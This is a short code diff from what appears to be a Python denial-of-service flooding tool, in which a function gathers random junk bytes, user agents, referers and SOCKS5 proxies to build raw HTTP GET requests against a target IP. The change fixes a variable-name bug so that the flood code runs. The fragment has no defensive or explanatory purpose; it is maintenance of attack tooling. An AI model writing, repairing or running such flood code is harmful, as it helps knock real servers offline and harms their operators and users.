@@ -177,7 +177,7 @@ def join():
   global useragents, ref, socks5
   hh = random._urandom(7500)
   xx = int(0)
-  userddos = "UserAgents"+random.choice(UserAgents)+"\r\n"
+  userddos = "UserAgents"+random.choice(useragents)+"\r\n"
   refall = random.choice(ref)
   sockzan = "Socket: "+random.choice(socks5)+"\r\n"
   get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
